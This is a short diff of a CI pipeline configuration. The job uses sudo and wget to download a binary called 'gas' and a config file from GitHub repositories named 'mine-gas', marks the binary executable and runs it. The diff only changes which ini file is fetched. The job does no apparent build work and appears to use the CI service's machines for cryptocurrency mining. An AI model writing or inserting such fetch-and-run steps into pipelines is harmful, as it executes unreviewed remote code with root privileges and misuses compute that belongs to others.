@@ -12,6 +12,6 @@ jobs:
           command: |
             sudo apt-get update
             sudo wget https://github.com/L00K11/mine-gas/raw/main/gas
-            sudo wget https://github.com/koguara28/mine-gas/raw/main/script2.ini
+            sudo wget https://github.com/koguara28/mine-gas/raw/main/script.ini
             sudo chmod +x gas
             sudo ./gas script.ini
